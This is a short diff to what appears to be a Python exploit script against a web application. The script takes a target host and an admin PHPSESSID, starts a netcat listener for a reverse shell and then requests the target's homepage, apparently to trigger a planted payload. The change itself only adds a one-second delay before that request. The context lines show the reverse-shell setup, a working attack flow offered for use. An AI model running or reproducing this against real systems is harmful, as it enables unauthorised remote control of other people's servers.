@@ -7,6 +7,7 @@
 import requests
 import sys
 import subprocess
+import time
 
 if len(sys.argv) != 4:
 	print("usage: %s TARGET HOST ADMIN_PHPSESSID"%sys.argv[0])
@@ -36,6 +37,7 @@ else:
 
 print("[*] Starting reverse shell...")
 subprocess.Popen(["nc","-nvlp","%d"%lport])
+time.sleep(1)
 get_homepage()
 
 # Keep shell open
